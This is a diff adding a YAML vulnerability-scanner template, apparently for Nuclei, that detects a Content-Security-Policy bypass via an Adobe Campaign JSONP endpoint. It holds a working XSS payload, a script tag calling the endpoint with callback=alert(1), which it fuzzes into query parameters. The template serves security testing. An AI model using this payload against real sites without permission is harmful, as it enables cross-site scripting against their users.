@@ -1,0 +1,55 @@
+id: adobe-campaign-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Adobe Campaign
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,adobe-campaign
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "adobe.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: adobe_campaign_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://lghnh-mkt-prod1.campaign.adobe.com/lgh/at_seg_list.jssp?callback=alert(1)-"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "adobe_campaign_csp_xss == true"
+# digest: 4a0a0047304502210087a3fc4c6530727ce52242ada76e9ed06515a86ee9c232a177da7d1f38beed4402207a494af920d59b32b6ba4a9940db238fe4f3251a587280b33de07635c042b87f:922c64590222798bb761d5b6d8e72950
